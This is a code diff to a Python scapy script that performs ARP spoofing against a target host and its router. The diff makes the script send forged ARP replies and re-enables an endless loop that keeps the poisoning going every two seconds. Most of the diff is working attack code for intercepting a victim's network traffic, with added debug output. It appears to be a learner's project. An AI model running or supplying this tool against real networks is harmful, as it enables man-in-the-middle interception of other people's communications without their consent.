@@ -36,12 +36,24 @@ ROUTER_MAC = "84:26:15:f9:16:44"
 
 def get_mac_address(ip_address):
     broadcast_layer = scapy.Ether(dst=BROADCAST_MAC)
-    broadcast_layer.show()
+    # output = broadcast_layer.show(dump=True)
+    # print(f"broadcast_layer:\n{output}")
 
     arp_layer = scapy.ARP(pdst=ip_address)
+    # output = arp_layer.show(dump=True)
+    # # print(f"arp_layer:\n{output}")
+
     get_mac_packet = broadcast_layer / arp_layer
+    # output = get_mac_packet.show(dump=True)
+    # print(f"get_mac_packet:\n{output}")
+
     answer, unanswer = scapy.srp(get_mac_packet, timeout=2, verbose=False)
+    print(f"answer: {answer}")
     sent, received = answer[0]
+    # output = sent.show(dump=True)
+    # print(f"sent:\n{output}")
+    # output = received.show(dump=True)
+    # print(f"received:\n{output}")
     return received.hwsrc
 
 
@@ -52,6 +64,9 @@ def spoof(router_ip, target_ip, router_mac, target_mac):
         hwdst=router_mac,
         pdst=router_ip,
     )
+    output = router_packet.show(dump=True)
+    print("router spoof packet")
+    print(output)
 
     target_packet = scapy.ARP(
         op=2,
@@ -59,6 +74,12 @@ def spoof(router_ip, target_ip, router_mac, target_mac):
         hwdst=target_mac,
         pdst=target_ip,
     )
+    output = target_packet.show(dump=True)
+    print("router spoof packet")
+    print(output)
+
+    scapy.send(router_packet)
+    scapy.send(target_packet)
 
 
 target_mac = get_mac_address(target_ip)
@@ -67,9 +88,13 @@ router_mac = get_mac_address(router_ip)
 print(f"target: ip={target_ip}, mac={target_mac}")
 print(f"router: ip={router_ip}, mac={router_mac}")
 
-# try:
-#     while True:
-#         spoof(router_ip, target_ip, router_mac, target_mac)
-# except KeyboardInterrupt:
-#     print('Closing ARP spoofer')
-#     exit(0)
+spoof(router_ip, target_ip, router_mac, target_mac)
+
+try:
+    print("START spoof loop")
+    while True:
+        spoof(router_ip, target_ip, router_mac, target_mac)
+        time.sleep(2)
+except KeyboardInterrupt:
+    print('STOP spoof loop')
+    exit(0)
